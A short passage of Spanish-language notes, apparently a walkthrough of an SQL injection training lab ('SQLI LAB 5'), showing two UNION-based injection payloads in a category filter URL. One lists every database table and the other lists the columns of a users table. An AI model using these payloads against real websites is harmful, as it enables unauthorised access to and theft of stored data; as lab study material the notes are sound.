...
![[SQLI LAB 5/image_8.png]]

Para `listar` las `tablas` de todas las bases de datos

```
/filter?category=Lifestyle'+union+select+null,string_agg(table_name,',')+from+information_schema.tables--+-+
```
...
```
/filter?category=Lifestyle%27+union+select+null,array_to_string(array_agg(column_name),E'\n')+from+information_schema.columns+where+table_name='users_nlnyoc'--+-+
```
